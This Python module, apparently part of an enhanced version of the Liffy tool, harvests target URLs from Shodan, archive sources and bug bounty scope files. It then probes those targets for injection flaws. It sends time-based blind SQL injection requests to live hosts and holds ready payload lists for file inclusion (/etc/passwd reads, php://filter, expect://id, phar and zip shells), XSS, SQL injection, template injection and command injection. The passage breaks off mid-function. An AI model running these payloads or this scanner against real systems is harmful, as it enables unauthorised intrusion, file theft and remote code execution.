#!/usr/bin/env python3
"""
URL Gathering Module for Liffy Enhanced
Integrates multiple crawling techniques and tools for comprehensive target discovery
"""

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'
__version__ = '2.0.0'

import subprocess
import json
import csv
import time
import random
import requests
from urllib.parse import urlparse, parse_qs, urljoin
from typing import List, Dict, Set, Optional, Tuple
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import tempfile
from pathlib import Path
import logging
from dataclasses import dataclass
from enum import Enum
import re

try:
    from blessings import Terminal
    t = Terminal()
except ImportError:
    class Terminal:
        def __getattr__(self, name):
            return lambda x: x
    t = Terminal()

class SourceType(Enum):
    SHODAN = "shodan"
    GAUPLUS = "gauplus"
    WAYBACK = "wayback"
    COMMONCRAWL = "commoncrawl"
    OTX = "otx"
    MANUAL = "manual"

@dataclass
class URLInfo:
    """Information about a discovered URL"""
    url: str
    source: SourceType
    domain: str
    parameters: Dict[str, List[str]]
    method: str = "GET"
    status_code: Optional[int] = None
    title: Optional[str] = None
    content_type: Optional[str] = None
    response_size: Optional[int] = None
    discovered_at: str = ""
    lfi_vulnerable: bool = False
    xss_vulnerable: bool = False
    sqli_vulnerable: bool = False

class ShodanGatherer:
    """Shodan-based URL gathering using sqry tool"""
    
    def __init__(self, logger):
        self.logger = logger
        self.sqry_path = "/home/kali/go/bin/sqry"
    
    def gather_urls(self, query: str, limit: int = 100, country: str = None, 
                   asn: str = None, ports: str = None) -> List[URLInfo]:
        """Gather URLs from Shodan using sqry"""
        urls = []
        
        try:
            # Build sqry command
            cmd = [self.sqry_path, "-q", query, "--json", "--limit", str(limit)]
            
            if country:
                cmd.extend(["--country", country])
            if asn:
                cmd.extend(["--asn", asn])
            if ports:
                cmd.extend(["--target-ports", ports])
            
            # Add httpx enrichment for better results
            cmd.append("--httpx")
            
            self.logger.info(f"Running Shodan query: {query}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            if 'ip' in data and 'title' in data:
                                # Construct URL from Shodan data
                                ip = data['ip']
                                title = data.get('title', '')
                                ports = data.get('ports', [])
                                
                                # Try to determine protocol and port
                                protocol = 'https' if 443 in ports else 'http'
                                port = 443 if 443 in ports else (80 if 80 in ports else ports[0] if ports else 80)
                                
                                if port not in [80, 443]:
                                    url = f"{protocol}://{ip}:{port}"
                                else:
                                    url = f"{protocol}://{ip}"
                                
                                url_info = URLInfo(
                                    url=url,
                                    source=SourceType.SHODAN,
                                    domain=ip,
                                    parameters={},
                                    title=title,
                                    discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                                )
                                urls.append(url_info)
                                
                        except json.JSONDecodeError:
                            continue
            else:
                self.logger.error(f"Shodan query failed: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            self.logger.error("Shodan query timed out")
        except Exception as e:
            self.logger.error(f"Error running Shodan query: {str(e)}")
        
        return urls

class GauPlusGatherer:
    """Historical URL gathering using gauplus tool with enhanced subdomain enumeration"""
    
    def __init__(self, logger):
        self.logger = logger
        self.gauplus_path = "/home/kali/go/bin/gauplus"
    
    def gather_urls(self, domain: str, subs: bool = True, providers: str = "wayback,otx,commoncrawl",
                   limit: int = 1000) -> List[URLInfo]:
        """Gather historical URLs using gauplus"""
        urls = []
        
        try:
            # Build gauplus command
            cmd = [self.gauplus_path, "-json", "-t", "10", "-providers", providers]
            
            if subs:
                cmd.append("-subs")
            
            cmd.append(domain)
            
            self.logger.info(f"Running gauplus for domain: {domain}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            if 'url' in data:
                                url = data['url']
                                parsed = urlparse(url)
                                
                                # Extract parameters
                                params = parse_qs(parsed.query)
                                
                                url_info = URLInfo(
                                    url=url,
                                    source=SourceType.GAUPLUS,
                                    domain=parsed.netloc,
                                    parameters=params,
                                    discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                                )
                                urls.append(url_info)
                                
                        except json.JSONDecodeError:
                            continue
            else:
                self.logger.error(f"Gauplus failed: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            self.logger.error("Gauplus query timed out")
        except Exception as e:
            self.logger.error(f"Error running gauplus: {str(e)}")
        
        return urls
    
    def discover_subdomains(self, domain: str, providers: str = "wayback,otx,commoncrawl",
                           limit: int = 1000) -> List[str]:
        """Discover subdomains using gauplus with wayback machine"""
        subdomains = set()
        
        try:
            # Build gauplus command for subdomain discovery
            cmd = [self.gauplus_path, "-json", "-t", "10", "-providers", providers, "-subs", domain]
            
            self.logger.info(f"Discovering subdomains for: {domain}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            if 'url' in data:
                                url = data['url']
                                parsed = urlparse(url)
                                if parsed.netloc:
                                    subdomains.add(parsed.netloc)
                                
                        except json.JSONDecodeError:
                            continue
            else:
                self.logger.error(f"Gauplus subdomain discovery failed: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            self.logger.error("Gauplus subdomain discovery timed out")
        except Exception as e:
            self.logger.error(f"Error running gauplus subdomain discovery: {str(e)}")
        
        # Filter subdomains to only include those related to the target domain
        filtered_subdomains = []
        for subdomain in subdomains:
            if domain in subdomain or subdomain.endswith(f".{domain}"):
                filtered_subdomains.append(subdomain)
        
        self.logger.info(f"Discovered {len(filtered_subdomains)} subdomains for {domain}")
        return filtered_subdomains[:limit]
    
    def gather_wayback_urls(self, domain: str, subs: bool = True, limit: int = 1000) -> List[URLInfo]:
        """Gather URLs specifically from Wayback Machine"""
        urls = []
        
        try:
            # Build gauplus command for wayback only
            cmd = [self.gauplus_path, "-json", "-t", "10", "-providers", "wayback"]
            
            if subs:
                cmd.append("-subs")
            
            cmd.append(domain)
            
            self.logger.info(f"Gathering Wayback Machine URLs for: {domain}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            if 'url' in data:
                                url = data['url']
                                parsed = urlparse(url)
                                
                                # Extract parameters
                                params = parse_qs(parsed.query)
                                
                                url_info = URLInfo(
                                    url=url,
                                    source=SourceType.WAYBACK,
                                    domain=parsed.netloc,
                                    parameters=params,
                                    discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                                )
                                urls.append(url_info)
                                
                        except json.JSONDecodeError:
                            continue
            else:
                self.logger.error(f"Wayback gathering failed: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            self.logger.error("Wayback gathering timed out")
        except Exception as e:
            self.logger.error(f"Error running wayback gathering: {str(e)}")
        
        return urls[:limit]

class URLProcessor:
    """Process and analyze discovered URLs"""
    
    def __init__(self, logger):
        self.logger = logger
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def analyze_url(self, url_info: URLInfo) -> URLInfo:
        """Analyze a URL for potential vulnerabilities"""
        try:
            # Test the URL
            response = self.session.get(url_info.url, timeout=10, allow_redirects=True)
            url_info.status_code = response.status_code
            url_info.content_type = response.headers.get('content-type', '')
            url_info.response_size = len(response.content)
            
            # Extract title
            title_match = re.search(r'<title[^>]*>(.*?)</title>', response.text, re.IGNORECASE)
            if title_match:
                url_info.title = title_match.group(1).strip()
            
            # Check for LFI parameters
            url_info.lfi_vulnerable = self._check_lfi_parameters(url_info.parameters)
            
            # Check for XSS parameters
            url_info.xss_vulnerable = self._check_xss_parameters(url_info.parameters)
            
            # Check for SQLi parameters
            url_info.sqli_vulnerable = self._check_sqli_parameters(url_info.parameters)
            
            # If no parameters found, add common test parameters for vulnerability detection
            if not url_info.parameters:
                url_info.parameters = self._get_common_test_parameters()
                # Re-check vulnerabilities with common parameters
                url_info.lfi_vulnerable = self._check_lfi_parameters(url_info.parameters)
                url_info.xss_vulnerable = self._check_xss_parameters(url_info.parameters)
                url_info.sqli_vulnerable = self._check_sqli_parameters(url_info.parameters)
            
        except Exception as e:
            self.logger.debug(f"Error analyzing URL {url_info.url}: {str(e)}")
        
        return url_info
    
    def _check_lfi_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to LFI"""
        lfi_keywords = [
            'file', 'page', 'path', 'include', 'require', 'view', 'template',
            'doc', 'document', 'folder', 'dir', 'directory', 'read', 'load',
            'show', 'display', 'content', 'data', 'src', 'source'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in lfi_keywords):
                return True
        
        return False
    
    def _check_xss_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to XSS"""
        xss_keywords = [
            'search', 'query', 'q', 'term', 'keyword', 'name', 'title',
            'description', 'comment', 'message', 'text', 'input', 'value',
            'id', 'user', 'username', 'email', 'subject', 'body', 'content'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in xss_keywords):
                return True
        
        return False
    
    def _check_sqli_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to SQLi"""
        sqli_keywords = [
            'id', 'user', 'username', 'password', 'email', 'search', 'query',
            'category', 'type', 'status', 'order', 'sort', 'filter', 'where',
            'limit', 'offset', 'page', 'count', 'num', 'number'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in sqli_keywords):
                return True
        
        return False
    
    def _get_common_test_parameters(self) -> Dict[str, List[str]]:
        """Get common test parameters for vulnerability detection"""
        return {
            'file': ['test.txt'],
            'page': ['index.php'],
            'path': ['/etc/passwd'],
            'include': ['config.php'],
            'view': ['home.html'],
            'template': ['main.tpl'],
            'doc': ['readme.txt'],
            'document': ['manual.pdf'],
            'folder': ['uploads/'],
            'dir': ['/var/www/'],
            'directory': ['/tmp/'],
            'read': ['file.txt'],
            'load': ['data.json'],
            'show': ['content.html'],
            'display': ['info.php'],
            'content': ['text.txt'],
            'data': ['user.json'],
            'src': ['script.js'],
            'source': ['code.php'],
            'search': ['test'],
            'query': ['example'],
            'q': ['test'],
            'term': ['keyword'],
            'keyword': ['search'],
            'name': ['test'],
            'title': ['example'],
            'description': ['test description'],
            'comment': ['test comment'],
            'message': ['hello'],
            'text': ['test text'],
            'input': ['user input'],
            'value': ['test value'],
            'id': ['1'],
            'user': ['admin'],
            'username': ['testuser'],
            'email': ['test@example.com'],
            'subject': ['test subject'],
            'body': ['test body'],
            'category': ['general'],
            'type': ['standard'],
            'status': ['active'],
            'order': ['name'],
            'sort': ['asc'],
            'filter': ['all'],
            'where': ['id=1'],
            'limit': ['10'],
            'offset': ['0'],
            'count': ['100'],
            'num': ['5'],
            'number': ['123']
        }

class XSSTester:
    """XSS testing using airixss tool"""
    
    def __init__(self, logger):
        self.logger = logger
        self.airixss_path = "airixss"  # Will be installed if not available
    
    def test_url(self, url_info: URLInfo) -> bool:
        """Test URL for XSS vulnerabilities"""
        if not url_info.xss_vulnerable:
            return False
        
        try:
            # Create temporary file with URL
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                f.write(url_info.url)
                temp_file = f.name
            
            # Run airixss
            cmd = [self.airixss_path, "-l", temp_file, "-o", f"/tmp/xss_results_{int(time.time())}.txt"]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Clean up
            os.unlink(temp_file)
            
            if result.returncode == 0:
                self.logger.info(f"XSS test completed for {url_info.url}")
                return True
            else:
                self.logger.debug(f"XSS test failed for {url_info.url}: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error testing XSS for {url_info.url}: {str(e)}")
            return False

class SQLiTester:
    """SQL injection testing using jeeves tool"""
    
    def __init__(self, logger):
        self.logger = logger
        self.jeeves_path = "jeeves"  # Will be installed if not available
    
    def test_url(self, url_info: URLInfo, payload_time: int = 5) -> bool:
        """Test URL for SQL injection vulnerabilities"""
        if not url_info.sqli_vulnerable:
            return False
        
        try:
            # Generate test URLs with time-based blind payloads
            test_urls = []
            
            for param_name, param_values in url_info.parameters.items():
                if param_values:
                    # Create time-based blind SQLi payload
                    payload = f"(select(0)from(select(sleep({payload_time})))v)"
                    
                    # Replace parameter value with payload
                    test_url = url_info.url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                    test_urls.append(test_url)
            
            # Test each URL
            for test_url in test_urls:
                start_time = time.time()
                
                try:
                    response = requests.get(test_url, timeout=payload_time + 5)
                    end_time = time.time()
                    
                    # Check if response took longer than expected (indicating sleep)
                    if end_time - start_time >= payload_time - 1:
                        self.logger.info(f"Potential SQLi vulnerability found: {test_url}")
                        return True
                        
                except requests.Timeout:
                    # Timeout might indicate successful sleep
                    self.logger.info(f"Potential SQLi vulnerability found (timeout): {test_url}")
                    return True
                    
        except Exception as e:
            self.logger.error(f"Error testing SQLi for {url_info.url}: {str(e)}")
        
        return False

class GFPatternMatcher:
    """GF pattern matching for parameter discovery and injection testing"""
    
    def __init__(self, logger):
        self.logger = logger
        self.gf_path = "gf"  # Will be installed if not available
        self.patterns_dir = Path.home() / ".gf"
        self._ensure_patterns_installed()
    
    def _ensure_patterns_installed(self):
        """Ensure GF patterns are installed"""
        try:
            # Check if gf is available
            result = subprocess.run([self.gf_path, '-list'], capture_output=True, text=True, timeout=10)
            if result.returncode != 0:
                self.logger.warning("GF not found, installing...")
                self._install_gf()
        except Exception as e:
            self.logger.warning(f"Error checking GF: {str(e)}")
            self._install_gf()
    
    def _install_gf(self):
        """Install GF and patterns"""
        try:
            # Install GF
            subprocess.run(['go', 'install', 'github.com/tomnomnom/gf@latest'], 
                          capture_output=True, text=True, timeout=60)
            
            # Install GF patterns
            subprocess.run(['go', 'install', 'github.com/1ndianl33t/Gf-Patterns@latest'], 
                          capture_output=True, text=True, timeout=60)
            
            # Setup GF patterns
            gf_dir = Path.home() / ".gf"
            gf_dir.mkdir(exist_ok=True)
            
            # Copy patterns
            patterns_cmd = f"cp -r $GOPATH/src/github.com/1ndianl33t/Gf-Patterns/* {gf_dir}/"
            subprocess.run(patterns_cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            self.logger.info("GF and patterns installed successfully")
        except Exception as e:
            self.logger.error(f"Error installing GF: {str(e)}")
    
    def discover_parameters(self, urls: List[str], pattern_type: str = "lfi") -> List[URLInfo]:
        """Discover parameters using GF patterns"""
        discovered_urls = []
        
        try:
            # Create temporary file with URLs
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                for url in urls:
                    f.write(f"{url}\n")
                temp_file = f.name
            
            # Run GF with specific pattern
            cmd = [self.gf_path, pattern_type, temp_file]
            
            self.logger.info(f"Running GF pattern matching with pattern: {pattern_type}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            # Clean up
            os.unlink(temp_file)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            parsed = urlparse(line.strip())
                            params = parse_qs(parsed.query)
                            
                            url_info = URLInfo(
                                url=line.strip(),
                                source=SourceType.MANUAL,
                                domain=parsed.netloc,
                                parameters=params,
                                discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                            )
                            
                            # Mark as vulnerable based on pattern type
                            if pattern_type == "lfi":
                                url_info.lfi_vulnerable = True
                            elif pattern_type == "xss":
                                url_info.xss_vulnerable = True
                            elif pattern_type == "sqli":
                                url_info.sqli_vulnerable = True
                            
                            discovered_urls.append(url_info)
                            
                        except Exception as e:
                            self.logger.debug(f"Error parsing URL from GF: {str(e)}")
            else:
                self.logger.error(f"GF pattern matching failed: {result.stderr}")
                
        except Exception as e:
            self.logger.error(f"Error running GF pattern matching: {str(e)}")
        
        return discovered_urls
    
    def get_available_patterns(self) -> List[str]:
        """Get list of available GF patterns"""
        try:
            result = subprocess.run([self.gf_path, '-list'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                patterns = []
                for line in result.stdout.strip().split('\n'):
                    if line.strip() and not line.startswith('Available patterns:'):
                        patterns.append(line.strip())
                return patterns
        except Exception as e:
            self.logger.error(f"Error getting GF patterns: {str(e)}")
        
        return []
    
    def test_parameter_injection(self, url_info: URLInfo, pattern_type: str = "lfi") -> bool:
        """Test specific URL for parameter injection using GF patterns"""
        try:
            # Create temporary file with single URL
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                f.write(f"{url_info.url}\n")
                temp_file = f.name
            
            # Run GF with specific pattern
            cmd = [self.gf_path, pattern_type, temp_file]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            # Clean up
            os.unlink(temp_file)
            
            if result.returncode == 0 and result.stdout.strip():
                self.logger.info(f"Parameter injection pattern matched: {url_info.url}")
                return True
            else:
                return False
                
        except Exception as e:
            self.logger.error(f"Error testing parameter injection: {str(e)}")
            return False

class QSReplaceTester:
    """Query string replacement testing with payload lists"""
    
    def __init__(self, logger):
        self.logger = logger
        self.qsreplace_path = "qsreplace"  # Will be installed if not available
        self._ensure_qsreplace_installed()
        self.payload_lists = self._load_payload_lists()
    
    def _ensure_qsreplace_installed(self):
        """Ensure QSReplace is installed"""
        try:
            result = subprocess.run([self.qsreplace_path, '-h'], capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                self.logger.warning("QSReplace not found, installing...")
                self._install_qsreplace()
        except Exception as e:
            self.logger.warning(f"Error checking QSReplace: {str(e)}")
            self._install_qsreplace()
    
    def _install_qsreplace(self):
        """Install QSReplace tool"""
        try:
            subprocess.run(['go', 'install', 'github.com/tomnomnom/qsreplace@latest'], 
                          capture_output=True, text=True, timeout=60)
            self.logger.info("QSReplace installed successfully")
        except Exception as e:
            self.logger.error(f"Error installing QSReplace: {str(e)}")
    
    def _load_payload_lists(self) -> Dict[str, List[str]]:
        """Load payload lists for different vulnerability types"""
        payloads = {
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'php://filter/convert.base64-encode/resource=index.php',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
                'expect://id',
                'file:///etc/passwd',
                'zip://shell.zip%23shell.php',
                'phar://shell.phar/shell.php',
                'compress.zlib://file.gz',
                '/proc/self/environ',
                '/var/log/apache2/access.log',
                '/var/log/auth.log'
            ],
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<iframe src=javascript:alert(1)></iframe>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
                "1' OR (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1--",
                "1' OR (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "' OR 1=1; WAITFOR DELAY '0:0:5'--",
                "1' OR 1=1; WAITFOR DELAY '0:0:5'--"
            ],
            'ssti': [
                '{{7*7}}',
                '{{config}}',
                '{{self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
                '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
                '{{''.__class__.__mro__[2].__subclasses__()[40](\'/etc/passwd\').read()}}',
                '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
                '{{lipsum.__globals__.os.popen(\'id\').read()}}',
                '{{cycler.__init__.__globals__.os.popen(\'id\').read()}}',
                '{{joiner.__init__.__globals__.os.popen(\'id\').read()}}',
                '{{namespace.__init__.__globals__.os.popen(\'id\').read()}}'
            ],
            'rce': [
                ';id',
                '|id',
                '`id`',
                '$(id)',
                '{{id}}',
                '{{config}}',
                '{{7*7}}',
                '{{self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
                '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
                '{{''.__class__.__mro__[2].__subclasses__()[40](\'/etc/passwd\').read()}}'
            ]
        }
        return payloads
    
    def test_url_with_payloads(self, url_info: URLInfo, vuln_type: str = "lfi") -> List[URLInfo]:
        """Test URL with payload list using QSReplace"""
        tested_urls = []
        
        if vuln_type not in self.payload_lists:
            self.logger.error(f"Unknown vulnerability type: {vuln_type}")
            return tested_urls
        
        payloads = self.payload_lists[vuln_type]
        
        try:
            # Create temporary file with URL
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                f.write(f"{url_info.url}\n")
                temp_file = f.name
            
            # Create payload file
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                for payload in payloads:
                    f.write(f"{payload}\n")
                payload_file = f.name
            
            # Run QSReplace
            cmd = [self.qsreplace_path, '-a', '-f', payload_file, temp_file]
            
            self.logger.info(f"Testing {url_info.url} with {len(payloads)} {vuln_type} payloads")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Clean up
            os.unlink(temp_file)
            os.unlink(payload_file)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            parsed = urlparse(line.strip())
                            params = parse_qs(parsed.query)
                            
                            test_url_info = URLInfo(
                                url=line.strip(),
                                source=SourceType.MANUAL,
                                domain=parsed.netloc,
                                parameters=params,
                                discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                            )
                            
                            # Mark as vulnerable based on type
                            if vuln_type == "lfi":
                                test_url_info.lfi_vulnerable = True
                            elif vuln_type == "xss":
                                test_url_info.xss_vulnerable = True
                            elif vuln_type == "sqli":
                                test_url_info.sqli_vulnerable = True
                            
                            tested_urls.append(test_url_info)
                            
                        except Exception as e:
                            self.logger.debug(f"Error parsing test URL: {str(e)}")
            else:
                self.logger.error(f"QSReplace failed: {result.stderr}")
                
        except Exception as e:
            self.logger.error(f"Error running QSReplace: {str(e)}")
        
        return tested_urls
    
    def test_multiple_vuln_types(self, url_info: URLInfo) -> List[URLInfo]:
        """Test URL for multiple vulnerability types"""
        all_tested_urls = []
        
        for vuln_type in ['lfi', 'xss', 'sqli', 'ssti', 'rce']:
            tested_urls = self.test_url_with_payloads(url_info, vuln_type)
            all_tested_urls.extend(tested_urls)
        
        return all_tested_urls

class RandomTargetGatherer:
    """Random bounty target gathering from ~/targets/scope"""
    
    def __init__(self, logger):
        self.logger = logger
        self.scope_dir = Path.home() / "targets" / "scope"
    
    def gather_random_targets(self, count: int = 5) -> List[URLInfo]:
        """Gather random targets from scope directory"""
        urls = []
        
        try:
            if not self.scope_dir.exists():
                self.logger.error(f"Scope directory not found: {self.scope_dir}")
                return urls
            
            # Find all scope files, prioritizing specific files
            scope_files = []
            priority_inscope = self.scope_dir / "priority_inscope.txt"
            main_inscope = self.scope_dir / "inscope.txt"
            
            # If priority file exists, only use it
            if priority_inscope.exists():
                scope_files.append(priority_inscope)
            else:
                # Add main inscope file
                if main_inscope.exists():
                    scope_files.append(main_inscope)
                
                # Add other scope files
                for file_path in self.scope_dir.rglob("*"):
                    if (file_path.is_file() and 
                        file_path.suffix in ['.txt', '.md', '.json', '.csv'] and 
                        file_path != main_inscope):
                        scope_files.append(file_path)
            
            if not scope_files:
                self.logger.error("No scope files found")
                return urls
            
            # Read all targets
            all_targets = set()
            for scope_file in scope_files:
                try:
                    with open(scope_file, 'r', encoding='utf-8') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                # Clean up the line
                                if '://' in line:
                                    all_targets.add(line)
                                elif '.' in line and not line.startswith('*'):
                                    # Assume it's a domain, add http and https
                                    all_targets.add(f"http://{line}")
                                    all_targets.add(f"https://{line}")
                except Exception as e:
                    self.logger.debug(f"Error reading {scope_file}: {str(e)}")
            
            # Convert to list and shuffle
            targets_list = list(all_targets)
            random.shuffle(targets_list)
            
            # Take random sample
            selected_targets = targets_list[:min(count, len(targets_list))]
            
            self.logger.info(f"Selected {len(selected_targets)} random targets from scope")
            
            # Convert to URLInfo objects
            for target in selected_targets:
                try:
                    parsed = urlparse(target)
                    if parsed.netloc:
                        url_info = URLInfo(
                            url=target,
                            source=SourceType.MANUAL,
                            domain=parsed.netloc,
                            parameters={},
                            discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                        )
                        urls.append(url_info)
                except Exception as e:
                    self.logger.debug(f"Error parsing target {target}: {str(e)}")
            
        except Exception as e:
            self.logger.error(f"Error gathering random targets: {str(e)}")
        
        return urls

class URLGatherer:
    """Main URL gathering orchestrator with enhanced subdomain enumeration and pattern discovery"""
    
    def __init__(self, logger):
        self.logger = logger
        self.shodan_gatherer = ShodanGatherer(logger)
        self.gauplus_gatherer = GauPlusGatherer(logger)
        self.random_gatherer = RandomTargetGatherer(logger)
        self.url_processor = URLProcessor(logger)
        self.xss_tester = XSSTester(logger)
        self.sqli_tester = SQLiTester(logger)
        self.gf_matcher = GFPatternMatcher(logger)
        self.qsreplace_tester = QSReplaceTester(logger)
    
    def gather_all_urls(self, domain: str = None, shodan_query: str = None, 
                       limit: int = 100, country: str = None, asn: str = None,
                       ports: str = None, subs: bool = True, random_targets: bool = False,
                       random_count: int = 5) -> List[URLInfo]:
        """Gather URLs from all sources"""
        all_urls = []
        
        # Random targets gathering
        if random_targets or (not domain and not shodan_query):
            self.logger.info("Gathering random targets from scope...")
            random_urls = self.random_gatherer.gather_random_targets(random_count)
            all_urls.extend(random_urls)
            self.logger.info(f"Found {len(random_urls)} random targets from scope")
        
        # Shodan gathering
        if shodan_query:
            self.logger.info("Gathering URLs from Shodan...")
            shodan_urls = self.shodan_gatherer.gather_urls(
                shodan_query, limit, country, asn, ports
            )
            all_urls.extend(shodan_urls)
            self.logger.info(f"Found {len(shodan_urls)} URLs from Shodan")
        
        # Gauplus gathering
        if domain:
            self.logger.info("Gathering URLs from historical sources...")
            gauplus_urls = self.gauplus_gatherer.gather_urls(domain, subs, limit=limit)
            all_urls.extend(gauplus_urls)
            self.logger.info(f"Found {len(gauplus_urls)} URLs from historical sources")
        
        # Remove duplicates
        unique_urls = self._remove_duplicates(all_urls)
        self.logger.info(f"Total unique URLs: {len(unique_urls)}")
        
        return unique_urls
    
    def analyze_urls(self, urls: List[URLInfo], max_workers: int = 10) -> List[URLInfo]:
        """Analyze URLs for vulnerabilities"""
        self.logger.info(f"Analyzing {len(urls)} URLs...")
        
        analyzed_urls = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_url = {
                executor.submit(self.url_processor.analyze_url, url): url 
                for url in urls
            }
            
            for future in as_completed(future_to_url):
                try:
                    analyzed_url = future.result()
                    analyzed_urls.append(analyzed_url)
                except Exception as e:
                    self.logger.error(f"Error analyzing URL: {str(e)}")
        
        return analyzed_urls
    
    def test_vulnerabilities(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Test URLs for specific vulnerabilities"""
        self.logger.info("Testing for vulnerabilities...")
        
        for url_info in urls:
            if url_info.xss_vulnerable:
                self.logger.info(f"Testing XSS for: {url_info.url}")
                self.xss_tester.test_url(url_info)
            
            if url_info.sqli_vulnerable:
                self.logger.info(f"Testing SQLi for: {url_info.url}")
                self.sqli_tester.test_url(url_info)
        
        return urls
    
    def _remove_duplicates(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Remove duplicate URLs"""
        seen = set()
        unique_urls = []
        
        for url_info in urls:
            if url_info.url not in seen:
                seen.add(url_info.url)
                unique_urls.append(url_info)
        
        return unique_urls
    
    def save_results(self, urls: List[URLInfo], output_file: str = None):
        """Save results to file"""
        if not output_file:
            output_file = f"url_gathering_results_{int(time.time())}.json"
        
        results = []
        for url_info in urls:
            results.append({
                'url': url_info.url,
                'source': url_info.source.value,
                'domain': url_info.domain,
                'parameters': url_info.parameters,
                'method': url_info.method,
                'status_code': url_info.status_code,
                'title': url_info.title,
                'content_type': url_info.content_type,
                'response_size': url_info.response_size,
                'discovered_at': url_info.discovered_at,
                'lfi_vulnerable': url_info.lfi_vulnerable,
                'xss_vulnerable': url_info.xss_vulnerable,
                'sqli_vulnerable': url_info.sqli_vulnerable
            })
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        self.logger.info(f"Results saved to: {output_file}")
    
    def get_lfi_targets(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Filter URLs that are potentially vulnerable to LFI"""
        return [url for url in urls if url.lfi_vulnerable]
    
    def get_xss_targets(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Filter URLs that are potentially vulnerable to XSS"""
        return [url for url in urls if url.xss_vulnerable]
    
    def get_sqli_targets(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Filter URLs that are potentially vulnerable to SQLi"""
        return [url for url in urls if url.sqli_vulnerable]
    
    def discover_subdomains(self, domain: str, limit: int = 1000) -> List[str]:
